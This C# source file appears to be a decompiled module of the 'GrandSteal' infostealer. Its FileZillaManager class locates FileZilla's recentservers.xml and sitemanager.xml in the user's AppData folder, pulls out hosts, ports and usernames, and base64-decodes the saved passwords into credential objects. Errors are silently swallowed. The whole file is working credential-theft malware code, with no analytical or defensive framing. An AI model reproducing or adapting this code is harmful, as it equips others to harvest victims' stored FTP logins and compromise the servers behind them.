using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x0200001A RID: 26
	public class FileZillaManager : ICredentialsManager<FtpCredential>
	{
		// Token: 0x06000093 RID: 147 RVA: 0x000061A0 File Offset: 0x000043A0
		public List<FtpCredential> GetAll()
		{
			List<FtpCredential> list = new List<FtpCredential>();
			try
			{
				string path = string.Format("{0}\\FileZilla\\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				string path2 = string.Format("{0}\\FileZilla\\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				if (File.Exists(path))
				{
					list.AddRange(FileZillaManager.ExtractFtpCredentials(path));
				}
				if (File.Exists(path2))
				{
					list.AddRange(FileZillaManager.ExtractFtpCredentials(path2));
				}
				return list;
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000094 RID: 148 RVA: 0x0000621C File Offset: 0x0000441C
		public static List<FtpCredential> ExtractFtpCredentials(string Path)
		{
			List<FtpCredential> list = new List<FtpCredential>();
			try
			{
				XmlTextReader reader = new XmlTextReader(Path);
				XmlDocument expr_12 = new XmlDocument();
				expr_12.Load(reader);
				using (IEnumerator enumerator = expr_12.DocumentElement.ChildNodes[0].ChildNodes.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						FtpCredential ftpCredential = FileZillaManager.ExtractRecentCredential((XmlNode)enumerator.Current);
						if (ftpCredential.Username != "UNKNOWN" && ftpCredential.Server != "UNKNOWN")
						{
							list.Add(ftpCredential);
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x06000095 RID: 149 RVA: 0x000062DC File Offset: 0x000044DC
		public static FtpCredential ExtractRecentCredential(XmlNode xmlNode)
		{
			FtpCredential ftpCredential = new FtpCredential();
			try
			{
				foreach (XmlNode xmlNode2 in xmlNode.ChildNodes)
				{
					if (xmlNode2.Name == "Host")
					{
						ftpCredential.Server = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Port")
					{
						ftpCredential.Server = ftpCredential.Server + ":" + xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "User")
					{
						ftpCredential.Username = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Pass")
					{
						ftpCredential.Password = FileZillaManager.Base64Decode(xmlNode2.InnerText);
					}
				}
			}
			catch
			{
			}
			finally
			{
				ftpCredential.Username = (string.IsNullOrEmpty(ftpCredential.Username) ? "UNKNOWN" : ftpCredential.Username);
				ftpCredential.Server = (string.IsNullOrEmpty(ftpCredential.Server) ? "UNKNOWN" : ftpCredential.Server);
				ftpCredential.Password = (string.IsNullOrEmpty(ftpCredential.Password) ? "UNKNOWN" : ftpCredential.Password);
			}
			return ftpCredential;
		}

		// Token: 0x06000096 RID: 150 RVA: 0x000062DC File Offset: 0x000044DC
		public static FtpCredential ExtractManagerCredential(XmlNode xmlNode)
		{
			FtpCredential ftpCredential = new FtpCredential();
			try
			{
				foreach (XmlNode xmlNode2 in xmlNode.ChildNodes)
				{
					if (xmlNode2.Name == "Host")
					{
						ftpCredential.Server = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Port")
					{
						ftpCredential.Server = ftpCredential.Server + ":" + xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "User")
					{
						ftpCredential.Username = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Pass")
					{
						ftpCredential.Password = FileZillaManager.Base64Decode(xmlNode2.InnerText);
					}
				}
			}
			catch
			{
			}
			finally
			{
				ftpCredential.Username = (string.IsNullOrEmpty(ftpCredential.Username) ? "UNKNOWN" : ftpCredential.Username);
				ftpCredential.Server = (string.IsNullOrEmpty(ftpCredential.Server) ? "UNKNOWN" : ftpCredential.Server);
				ftpCredential.Password = (string.IsNullOrEmpty(ftpCredential.Password) ? "UNKNOWN" : ftpCredential.Password);
			}
			return ftpCredential;
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00006448 File Offset: 0x00004648
		public static string Base64Decode(string input)
		{
			string result;
			try
			{
				byte[] bytes = Convert.FromBase64String(input);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = input;
			}
			return result;
		}
	}
}
